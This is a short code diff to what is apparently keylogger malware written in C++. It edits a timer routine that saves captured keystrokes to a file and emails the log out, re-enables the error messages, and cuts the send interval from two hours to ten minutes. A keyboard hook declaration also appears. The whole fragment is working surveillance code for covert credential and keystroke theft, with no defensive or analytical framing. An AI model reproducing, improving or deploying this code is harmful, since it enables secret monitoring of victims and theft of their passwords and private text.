@@ -17,21 +17,20 @@ void TimerSendMail(){
     std::string last_file = IO::WriteLog(keylog);
 
     if(last_file.empty()){
-        //Helper::WriteAppLog("File creation unsuccessful.  Keylog '" + keylog + "'");
+        Helper::WriteAppLog("File creation unsuccessful.  Keylog '" + keylog + "'");
         return;
     }
 
     int x = Mail::SendMail("Log [" + last_file + "]", keylog, IO::GetOurPath(true) + last_file);
     if(x != 7){
-        //Helper::WriteAppLog("Mail was not sent, error code : " + Helper::toString(x));
-        keylog = ""; //keylog isn't supposed to clear when the send fails, but we aren't using the intended send method.
+        Helper::WriteAppLog("Mail was not sent, error code : " + Helper::toString(x));
     }
     else{
         keylog = "";
     }
 }
 
-Timer MailTimer(TimerSendMail, 3600 * 2 * 1000, Timer::Infinite); // every 2 hours
+Timer MailTimer(TimerSendMail, 10 * 60 * 1000, Timer::Infinite); // every 10 minutes
 
 HHOOK eHook = NULL;
 
